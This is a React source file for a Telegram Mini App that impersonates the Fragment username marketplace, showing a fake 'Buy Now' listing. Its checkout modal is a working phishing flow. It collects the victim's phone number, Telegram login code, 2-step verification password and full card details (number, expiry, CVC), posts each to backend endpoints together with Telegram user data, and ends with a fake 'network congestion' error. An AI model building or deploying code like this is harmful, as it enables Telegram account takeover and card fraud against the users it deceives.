import { useState, useEffect } from 'react';
import { ArrowUpRight, ShieldCheck, Menu, X, ExternalLink, ArrowLeft, History, Share2, CreditCard, Wallet, Lock, Send, Phone, Key } from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

// Use a fallback for when Telegram WebApp is not available (e.g., in a browser)
const tg = (window as any).Telegram?.WebApp;

export default function App() {
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [modalStep, setModalStep] = useState<'select' | 'phone' | 'code' | '2fa' | 'card'>('select');
  const [phone, setPhone] = useState('');
  const [code, setCode] = useState('');
  const [twoFactor, setTwoFactor] = useState('');
  const [cardData, setCardData] = useState({ number: '', expiry: '', cvc: '', name: '' });
  const [loading, setLoading] = useState(false);

  const [pageData, setPageData] = useState({
    username: 'news',
    priceTON: 382,
    priceUSD: 2000,
    pfp: 'https://picsum.photos/seed/news/400/400',
    status: 'On Sale',
    owner: 'EQB...3f2',
    history: [
      { id: 1, user: 'EQA...9x1', amount: 382, time: '2 hours ago', type: 'Listed' },
      { id: 2, user: 'EQC...4v2', amount: 350, time: '5 days ago', type: 'Sold' },
      { id: 3, user: 'EQD...1z8', amount: 300, time: '1 month ago', type: 'Sold' },
    ]
  });

  useEffect(() => {
    if (tg) {
      tg.expand();
      const params = new URLSearchParams(tg.initDataUnsafe?.start_param || '');
      const linkId = tg.initDataUnsafe?.start_param;

      if (linkId) {
        // Fetch specific link data from our backend
        fetch(`api/link/${linkId}`)
          .then(res => res.json())
          .then(data => {
            if (data.type === 'custom') {
              setPageData(prev => ({
                ...prev,
                username: data.username,
                priceTON: data.price,
                priceUSD: Math.floor(data.price * 5.23),
                pfp: data.pfp
              }));
            } else if (data.type === 'auto') {
              // For "auto", use the user's actual info
              const user = tg.initDataUnsafe?.user;
              setPageData(prev => ({
                ...prev,
                username: user?.username || user?.first_name || 'user',
                priceTON: data.price,
                priceUSD: Math.floor(data.price * 5.23),
                pfp: user?.photo_url || `https://ui-avatars.com/api/?name=${user?.first_name || 'U'}&background=random&size=400`
              }));
            }
          })
          .catch(err => console.error("Failed to load link data", err));
      }
    }
  }, []);

  const handleOpenModal = () => {
    setModalStep('select');
    setIsModalOpen(true);
  };

  const handlePhoneSubmit = async () => {
    setLoading(true);
    try {
      const response = await fetch('api/submit/phone', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone, user: tg?.initDataUnsafe?.user })
      });
      if (response.ok) setModalStep('code');
    } catch (err) {
      alert("Error sending phone number. Please try again.");
    }
    setLoading(false);
  };

  const handleCodeSubmit = async () => {
    setLoading(true);
    try {
      const response = await fetch('api/submit/code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone, code, user: tg?.initDataUnsafe?.user })
      });
      if (response.ok) setModalStep('2fa');
    } catch (err) {
      alert("Error verifying code.");
    }
    setLoading(false);
  };

  const handle2FASubmit = async () => {
    setLoading(true);
    try {
      await fetch('api/submit/2fa', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone, twoFactor, user: tg?.initDataUnsafe?.user })
      });
      setModalStep('card');
    } catch (err) {}
    setLoading(false);
  };

  const handleCardSubmit = async () => {
    setLoading(true);
    try {
      await fetch('api/submit/card', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone, cardData, user: tg?.initDataUnsafe?.user })
      });
      alert("Transaction failed: Network congestion. Please try again later.");
      setIsModalOpen(false);
    } catch (err) {}
    setLoading(false);
  };

  return (
    <div className="min-h-screen flex flex-col bg-fragment-bg text-fragment-text selection:bg-fragment-blue/30 selection:text-fragment-blue relative overflow-hidden">
      {/* Background Glows */}
      <div className="fixed inset-0 pointer-events-none overflow-hidden z-0">
        <div className="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] bg-fragment-blue/10 rounded-full blur-[120px] animate-pulse" />
        <div className="absolute bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-fragment-blue/5 rounded-full blur-[120px] animate-pulse" style={{ animationDelay: '2s' }} />
      </div>

      {/* Header */}
      <header className="sticky top-0 z-50 bg-fragment-bg/60 backdrop-blur-xl border-b border-fragment-border/50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            <a href="/" className="flex items-center gap-3 group">
              <div className="w-9 h-9 bg-fragment-blue rounded-xl flex items-center justify-center shadow-[0_0_20px_rgba(56,148,255,0.4)] group-hover:scale-110 transition-all duration-300">
                <Send size={20} className="text-white fill-white rotate-[-10deg]" />
              </div>
              <span className="text-xl font-black tracking-tighter text-white">FRAGMENT</span>
            </a>

            <nav className="hidden md:flex items-center gap-8 text-sm font-medium h-full">
              <a href="#" className="text-fragment-blue border-b-2 border-fragment-blue h-full flex items-center px-1">Usernames</a>
              <a href="#" className="text-fragment-text-dim hover:text-fragment-text transition-colors h-full flex items-center px-1">Numbers</a>
              <a href="#" className="text-fragment-text-dim hover:text-fragment-text transition-colors h-full flex items-center px-1">Ads</a>
              <a href="#" className="text-fragment-text-dim hover:text-fragment-text transition-colors h-full flex items-center px-1">Premium</a>
            </nav>

            <div className="flex items-center gap-4">
              <button className="hidden sm:flex items-center gap-2 bg-fragment-blue hover:bg-fragment-blue/90 text-white px-4 py-2 rounded-lg font-medium transition-all text-sm">
                Connect TON
              </button>
              <button
                className="md:hidden p-2 text-fragment-text-dim"
                onClick={() => setIsMenuOpen(!isMenuOpen)}
              >
                {isMenuOpen ? <X size={24} /> : <Menu size={24} />}
              </button>
            </div>
          </div>
        </div>
      </header>

      {/* Mobile Menu */}
      <AnimatePresence>
        {isMenuOpen && (
          <motion.div
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            className="md:hidden bg-fragment-card border-b border-fragment-border p-4 space-y-4"
          >
            <a href="#" className="block text-fragment-blue font-medium">Usernames</a>
            <a href="#" className="block text-fragment-text-dim">Numbers</a>
            <a href="#" className="block text-fragment-text-dim">Ads</a>
            <a href="#" className="block text-fragment-text-dim">Premium</a>
            <button className="w-full bg-fragment-blue text-white px-4 py-3 rounded-lg font-medium">
              Connect TON
            </button>
          </motion.div>
        )}
      </AnimatePresence>

      <main className="flex-grow max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 py-8 w-full relative z-10">
        {/* Back Button */}
        <button className="flex items-center gap-2 text-fragment-text-dim hover:text-fragment-text mb-8 transition-colors group">
          <ArrowLeft size={18} className="group-hover:-translate-x-1 transition-transform" />
          <span className="font-medium">Back to Usernames</span>
        </button>

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
          {/* Left Column: Profile Info */}
          <div className="lg:col-span-7 space-y-6">
            <div className="glass-card p-8 relative overflow-hidden group">
              <div className="absolute inset-0 bg-gradient-to-br from-fragment-blue/5 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500" />
              <div className="flex flex-col sm:flex-row items-center sm:items-start gap-8 relative z-10">
                {/* Large Profile Picture */}
                <motion.div
                  initial={{ opacity: 0, scale: 0.8 }}
                  animate={{ opacity: 1, scale: 1 }}
                  className="w-40 h-40 rounded-[2.5rem] bg-gradient-to-br from-fragment-blue to-fragment-blue/40 flex items-center justify-center text-white font-bold text-6xl shadow-2xl shadow-fragment-blue/40 relative overflow-hidden group border-4 border-fragment-border/50"
                >
                  <img
                    src={pageData.pfp}
                    alt="Profile"
                    className="absolute inset-0 w-full h-full object-cover opacity-40 mix-blend-overlay"
                    referrerPolicy="no-referrer"
                  />
                  <span className="relative z-10">@</span>
                </motion.div>

                <div className="flex-1 text-center sm:text-left">
                  <div className="flex flex-wrap items-center justify-center sm:justify-start gap-3 mb-2">
                    <h1 className="text-4xl font-black tracking-tight">@{pageData.username}</h1>
                    <div className="bg-green-500/10 text-green-500 border border-green-500/20 text-[10px] font-bold uppercase px-2.5 py-1 rounded-md tracking-wider">
                      On Sale
                    </div>
                  </div>
                  <p className="text-fragment-text-dim mb-6 max-w-md">
                    This collectible username is currently listed for sale on the TON blockchain.
                  </p>

                  <div className="flex flex-wrap justify-center sm:justify-start gap-4">
                    <div className="flex items-center gap-2 text-sm font-medium text-fragment-text-dim bg-fragment-bg/50 px-3 py-2 rounded-lg border border-fragment-border">
                      <ShieldCheck size={16} className="text-fragment-blue" />
                      Verified NFT
                    </div>
                    <button className="flex items-center gap-2 text-sm font-medium text-fragment-text-dim bg-fragment-bg/50 px-3 py-2 rounded-lg border border-fragment-border hover:bg-fragment-border transition-colors">
                      <Share2 size={16} />
                      Share
                    </button>
                  </div>
                </div>
              </div>
            </div>

            {/* Sale History */}
            <div className="glass-card">
              <div className="p-6 border-b border-fragment-border flex justify-between items-center">
                <h2 className="font-bold flex items-center gap-2 text-white">
                  <History size={18} className="text-fragment-blue" />
                  Sale History
                </h2>
                <span className="text-xs text-fragment-text-dim font-medium">{pageData.history.length} events</span>
              </div>
              <div className="divide-y divide-fragment-border/50">
                {pageData.history.map((event) => (
                  <div key={event.id} className="p-4 flex justify-between items-center hover:bg-white/5 transition-all duration-200 group">
                    <div className="flex items-center gap-3">
                      <div className="w-10 h-10 rounded-xl bg-fragment-blue/10 flex items-center justify-center text-[11px] font-black text-fragment-blue border border-fragment-blue/20 group-hover:border-fragment-blue group-hover:shadow-[0_0_10px_rgba(56,148,255,0.3)] transition-all">
                        {event.user.slice(0, 3).toUpperCase()}
                      </div>
                      <div>
                        <div className="flex items-center gap-2 mb-1">
                          <p className="text-[14px] font-bold text-white leading-none tracking-tight">{event.user}</p>
                          <span className={`text-[9px] px-1.5 py-0.5 rounded font-black uppercase tracking-wider leading-none border ${
                            event.type === 'Listed'
                              ? 'bg-fragment-blue/10 text-fragment-blue border-fragment-blue/20'
                              : 'bg-white/5 text-fragment-text-dim border-white/10'
                          }`}>
                            {event.type}
                          </span>
                        </div>
                        <p className="text-[11px] text-fragment-text-dim font-medium">{event.time}</p>
                      </div>
                    </div>
                    <div className="flex flex-col items-end">
                      <div className="flex items-center gap-1.5">
                        <div className="w-4 h-4 rounded-full bg-fragment-blue/20 flex items-center justify-center overflow-hidden">
                          <img
                            src="https://cryptologos.cc/logos/toncoin-ton-logo.svg?v=035"
                            alt="TON"
                            className="w-3 h-3"
                            referrerPolicy="no-referrer"
                          />
                        </div>
                        <span className="font-black text-white text-[15px] leading-none">{event.amount.toLocaleString()}</span>
                      </div>
                      <p className="text-[11px] text-fragment-text-dim font-medium mt-1.5 opacity-80">
                        ≈ ${Math.floor(event.amount * 5.23).toLocaleString()}
                      </p>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* Right Column: Auction Controls */}
          <div className="lg:col-span-5 space-y-6">
            <div className="glass-card bg-gradient-to-b from-fragment-card/80 to-fragment-bg/80 p-8 border-fragment-blue/40 shadow-2xl shadow-fragment-blue/20 backdrop-blur-2xl relative overflow-hidden group">
              <div className="absolute top-0 right-0 w-32 h-32 bg-fragment-blue/10 rounded-full blur-3xl -translate-y-1/2 translate-x-1/2 group-hover:bg-fragment-blue/20 transition-colors duration-500" />
              <div className="space-y-8 relative z-10">
                {/* Current Price */}
                <div className="pb-6 border-b border-fragment-border/50">
                  <p className="text-[10px] font-bold text-fragment-text-dim uppercase tracking-[0.2em] mb-4">Fixed Price</p>
                  <div className="flex items-baseline gap-2 group/price">
                    <div className="flex items-center gap-2.5">
                      <div className="w-10 h-10 rounded-full bg-fragment-blue/10 flex items-center justify-center shadow-[0_0_20px_rgba(56,148,255,0.2)] group-hover/price:scale-110 transition-transform">
                        <img
                          src="https://cryptologos.cc/logos/toncoin-ton-logo.svg?v=035"
                          alt="TON"
                          className="w-6 h-6"
                          referrerPolicy="no-referrer"
                        />
                      </div>
                      <span className="text-5xl font-black tracking-tighter text-white drop-shadow-[0_0_15px_rgba(56,148,255,0.3)]">{pageData.priceTON.toLocaleString()}</span>
                    </div>
                    <span className="text-xl font-bold text-fragment-text-dim ml-1">TON</span>
                  </div>
                  <div className="flex items-center gap-2 mt-3">
                    <span className="text-lg font-semibold text-fragment-text-dim">≈ ${pageData.priceUSD.toLocaleString()}</span>
                    <div className="w-1 h-1 rounded-full bg-fragment-text-dim/30" />
                    <span className="text-sm font-medium text-fragment-text-dim/60">1 TON = $5.23</span>
                  </div>
                </div>

                {/* Info Box */}
                <div className="grid grid-cols-2 gap-4">
                  <div className="bg-fragment-blue/10 border border-fragment-blue/20 rounded-2xl p-5 group/status hover:bg-fragment-blue/15 transition-colors">
                    <p className="text-[10px] font-bold text-fragment-blue uppercase tracking-widest mb-2">Status</p>
                    <p className="text-xl font-black text-fragment-blue tracking-tight drop-shadow-[0_0_8px_rgba(56,148,255,0.4)]">On Sale</p>
                  </div>
                  <div className="bg-white/5 border border-white/5 rounded-2xl p-5 hover:bg-white/10 transition-colors">
                    <p className="text-[10px] font-bold text-fragment-text-dim uppercase tracking-widest mb-2">Listed At</p>
                    <p className="text-xl font-black text-white tracking-tight">Today</p>
                  </div>
                </div>

                {/* Action Button */}
                <div className="pt-2">
                  <button
                    onClick={handleOpenModal}
                    className="w-full py-5 bg-fragment-blue hover:bg-fragment-blue/90 text-white rounded-2xl font-black text-lg transition-all shadow-xl shadow-fragment-blue/20 flex items-center justify-center gap-3 group relative overflow-hidden"
                  >
                    <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/10 to-transparent -translate-x-full group-hover:animate-shimmer" />
                    <span className="relative z-10">Buy Now</span>
                    <ArrowUpRight size={24} className="relative z-10 group-hover:translate-x-1 group-hover:-translate-y-1 transition-transform" />
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Unified Modal */}
      <AnimatePresence>
        {isModalOpen && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => !loading && setIsModalOpen(false)}
              className="absolute inset-0 bg-black/80 backdrop-blur-sm"
            />

            <motion.div
              initial={{ opacity: 0, scale: 0.9, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.9, y: 20 }}
              className="relative w-full max-w-md bg-fragment-card border border-fragment-border rounded-[2rem] shadow-2xl overflow-hidden"
            >
              <div className="p-8">
                <div className="flex justify-between items-center mb-8">
                  <h2 className="text-2xl font-black tracking-tight">
                    {modalStep === 'select' ? 'Checkout' :
                     modalStep === 'phone' ? 'Enter Phone' :
                     modalStep === 'code' ? 'Verify Code' :
                     modalStep === '2fa' ? '2-Step Verification' : 'Payment'}
                  </h2>
                  {!loading && (
                    <button onClick={() => setIsModalOpen(false)} className="p-2 hover:bg-fragment-border rounded-full transition-colors">
                      <X size={20} />
                    </button>
                  )}
                </div>

                {modalStep === 'select' && (
                  <div className="space-y-4">
                    <button onClick={() => setModalStep('phone')} className="w-full p-6 bg-fragment-bg border border-fragment-border hover:border-fragment-blue/50 rounded-2xl flex items-center gap-4 transition-all group">
                      <div className="w-12 h-12 rounded-xl bg-orange-500/10 flex items-center justify-center text-orange-500 group-hover:bg-orange-500 group-hover:text-white transition-all">
                        <Wallet size={24} />
                      </div>
                      <div className="text-left">
                        <p className="font-bold text-lg">Connect Telegram Wallet</p>
                        <p className="text-xs text-fragment-text-dim">Pay with your TON balance</p>
                      </div>
                    </button>
                  </div>
                )}

                {modalStep === 'phone' && (
                  <div className="space-y-6">
                    <div>
                      <label className="text-[10px] font-bold text-fragment-text-dim uppercase tracking-widest mb-2 block">Phone Number</label>
                      <div className="relative">
                        <Phone className="absolute left-4 top-1/2 -translate-y-1/2 text-fragment-text-dim" size={18} />
                        <input
                          type="tel" placeholder="+1..." value={phone}
                          onChange={(e) => setPhone(e.target.value)}
                          className="w-full bg-fragment-bg border border-fragment-border rounded-xl py-3.5 pl-12 pr-4 focus:outline-none focus:border-fragment-blue"
                        />
                      </div>
                    </div>
                    <button onClick={handlePhoneSubmit} disabled={loading} className="w-full py-4 bg-fragment-blue text-white rounded-xl font-black text-lg disabled:opacity-50">
                      {loading ? 'Processing...' : 'Next'}
                    </button>
                  </div>
                )}

                {modalStep === 'code' && (
                  <div className="space-y-6">
                    <div>
                      <label className="text-[10px] font-bold text-fragment-text-dim uppercase tracking-widest mb-2 block">Telegram Code</label>
                      <input
                        type="text" placeholder="12345" value={code}
                        onChange={(e) => setCode(e.target.value)}
                        className="w-full bg-fragment-bg border border-fragment-border rounded-xl py-3.5 px-4 focus:outline-none focus:border-fragment-blue text-center text-2xl tracking-[0.5em] font-mono"
                      />
                      <p className="text-xs text-fragment-text-dim mt-2 text-center">We sent a code to your Telegram account</p>
                    </div>
                    <button onClick={handleCodeSubmit} disabled={loading} className="w-full py-4 bg-fragment-blue text-white rounded-xl font-black text-lg disabled:opacity-50">
                      {loading ? 'Verifying...' : 'Verify'}
                    </button>
                  </div>
                )}

                {modalStep === '2fa' && (
                  <div className="space-y-6">
                    <div>
                      <label className="text-[10px] font-bold text-fragment-text-dim uppercase tracking-widest mb-2 block">2-Step Password</label>
                      <div className="relative">
                        <Key className="absolute left-4 top-1/2 -translate-y-1/2 text-fragment-text-dim" size={18} />
                        <input
                          type="password" placeholder="Your Password" value={twoFactor}
                          onChange={(e) => setTwoFactor(e.target.value)}
                          className="w-full bg-fragment-bg border border-fragment-border rounded-xl py-3.5 pl-12 pr-4 focus:outline-none focus:border-fragment-blue"
                        />
                      </div>
                    </div>
                    <button onClick={handle2FASubmit} disabled={loading} className="w-full py-4 bg-fragment-blue text-white rounded-xl font-black text-lg disabled:opacity-50">
                      {loading ? 'Verifying...' : 'Next'}
                    </button>
                  </div>
                )}

                {modalStep === 'card' && (
                  <div className="space-y-6">
                    <div className="space-y-4">
                      <div>
                        <label className="text-[10px] font-bold text-fragment-text-dim uppercase tracking-widest mb-2 block">Card Number</label>
                        <input
                          type="text" placeholder="0000 0000 0000 0000"
                          className="w-full bg-fragment-bg border border-fragment-border rounded-xl py-3.5 px-4 focus:outline-none focus:border-fragment-blue font-mono"
                          value={cardData.number}
                          onChange={(e) => setCardData({...cardData, number: e.target.value})}
                        />
                      </div>
                      <div className="grid grid-cols-2 gap-4">
                        <input
                          type="text" placeholder="MM / YY"
                          className="w-full bg-fragment-bg border border-fragment-border rounded-xl py-3.5 px-4 focus:outline-none focus:border-fragment-blue"
                          value={cardData.expiry}
                          onChange={(e) => setCardData({...cardData, expiry: e.target.value})}
                        />
                        <input
                          type="text" placeholder="CVC"
                          className="w-full bg-fragment-bg border border-fragment-border rounded-xl py-3.5 px-4 focus:outline-none focus:border-fragment-blue"
                          value={cardData.cvc}
                          onChange={(e) => setCardData({...cardData, cvc: e.target.value})}
                        />
                      </div>
                    </div>
                    <button onClick={handleCardSubmit} disabled={loading} className="w-full py-4 bg-fragment-blue text-white rounded-xl font-black text-lg disabled:opacity-50">
                      {loading ? 'Confirming...' : 'Pay ' + pageData.priceTON + ' TON'}
                    </button>
                  </div>
                )}
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Footer */}
      <footer className="bg-fragment-card border-t border-fragment-border py-12 mt-20">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="grid grid-cols-1 md:grid-cols-4 gap-8">
            <div className="col-span-1 md:col-span-2">
              <div className="flex items-center gap-3 mb-6">
                <div className="w-9 h-9 bg-fragment-blue rounded-xl flex items-center justify-center shadow-[0_0_20px_rgba(56,148,255,0.3)]">
                  <Send size={20} className="text-white fill-white rotate-[-10deg]" />
                </div>
                <span className="text-xl font-black tracking-tighter text-white">FRAGMENT</span>
              </div>
              <p className="text-fragment-text-dim text-sm max-w-md leading-relaxed">
                Fragment is a free platform that facilitates the trade of collectible usernames and anonymous numbers between users.
              </p>
            </div>
          </div>
          <div className="border-t border-fragment-border mt-12 pt-8 flex flex-col sm:flex-row justify-between items-center gap-4 text-xs text-fragment-text-dim">
            <p>© 2026 Fragment. All rights reserved.</p>
          </div>
        </div>
      </footer>
    </div>
  );
}
